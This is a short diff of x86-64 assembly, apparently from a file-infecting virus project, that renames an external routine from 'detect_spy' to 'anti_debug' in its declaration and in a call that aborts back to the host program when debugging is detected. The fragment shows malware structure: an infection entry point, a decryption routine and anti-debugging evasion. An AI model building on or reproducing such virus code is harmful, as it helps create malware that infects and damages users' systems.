@@ -26,7 +26,7 @@ section .text
 extern _start
 extern virus
 extern decypher
-extern detect_spy
+extern anti_debug
 
 famine_entry:
 ;------------------------------; Store variables
@@ -100,7 +100,7 @@ mark_below:
 	add rsp, 16
 %endif
 ;------------------------------; check if client behaves well
-	call detect_spy
+	call anti_debug
 	test rax, rax
 	jnz return_to_client
 ;------------------------------; make ptld writable
